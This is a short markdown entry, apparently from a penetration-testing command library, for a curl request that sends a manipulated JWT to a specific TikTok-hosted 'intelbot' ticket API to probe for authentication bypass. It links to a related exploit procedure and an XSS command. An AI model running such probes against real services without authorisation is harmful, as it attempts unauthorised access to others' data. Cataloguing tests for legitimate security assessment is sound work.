---
data: 'curl -H "Authorization: Bearer [jwt-token]" [url] -X GET'
tags:
  - jwt
  - http
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 50c38385-d90b-4d87-987d-1cba1c8a3d83
created_at: '2025-12-11T03:47:56.574Z'
updated_at: '2025-12-11T03:47:56.574Z'
verified: false
validated: true
submitted: true
---
# curl-jwt-manipulation

## Command

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" https://intelbot.tiktok.com/api/tickets -X GET
```

## Description

This command sends an HTTP GET request with a manipulated JWT in the Authorization header to test for authentication bypass vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer [jwt]"` | Sets the JWT token header | Yes |
| `[url]` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer [jwt]" https://example.com/api
```

### Advanced Usage

```bash
curl -H "Authorization: Bearer [modified-jwt]" -v https://example.com/api
```

## Expected Output

JSON response containing unauthorized data if bypass succeeds, or an error if verification works.

## Related

- [[commands/curl-xss-injection]]
- [[procedures/Exploit-JWT-Authentication-Bypass-in-Intelbot-Service]]
